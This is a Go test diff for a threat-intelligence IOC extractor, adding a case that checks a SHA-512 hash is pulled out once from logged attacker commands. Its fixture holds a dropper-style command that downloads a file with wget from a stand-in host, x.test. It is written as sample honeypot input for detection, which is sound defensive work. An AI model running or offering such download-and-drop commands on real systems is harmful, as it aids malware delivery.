@@ -202,6 +202,44 @@ func TestExtractHashNoDoubleCounting(t *testing.T) {
 	}
 }
 
+// TestExtractSHA512 verifies a 128-hex SHA-512 (the hash modern threat-intel
+// feeds and sha512sum droppers use) is captured exactly once as a hash IOC and
+// not split into shorter hashes.
+func TestExtractSHA512(t *testing.T) {
+	e := NewExtractor()
+	sha512 := strings.Repeat("ab", 64) // 128 hex chars
+	ev := makeIOCEvent("203.0.113.1", "command",
+		fmt.Sprintf("wget http://x.test/m -O m && sha512sum m # %s", sha512), nil)
+	iocs := e.Extract(ev)
+	var hashes []string
+	for _, i := range iocs {
+		if i.Type == IOCTypeHash {
+			hashes = append(hashes, i.Value)
+		}
+	}
+	found := false
+	for _, h := range hashes {
+		if h == sha512 {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("SHA-512 not extracted as a hash IOC; got hashes=%v", hashes)
+	}
+	// Must not be split into shorter hashes (the \b anchors keep lengths
+	// disjoint): the only hash from a lone 128-hex token is the SHA-512 itself.
+	ev2 := makeIOCEvent("203.0.113.1", "command", sha512, nil)
+	n := 0
+	for _, i := range e.Extract(ev2) {
+		if i.Type == IOCTypeHash {
+			n++
+		}
+	}
+	if n != 1 {
+		t.Errorf("a lone SHA-512 token produced %d hash IOCs, want 1", n)
+	}
+}
+
 // ---- user agent ----
 
 func TestExtractUserAgent(t *testing.T) {
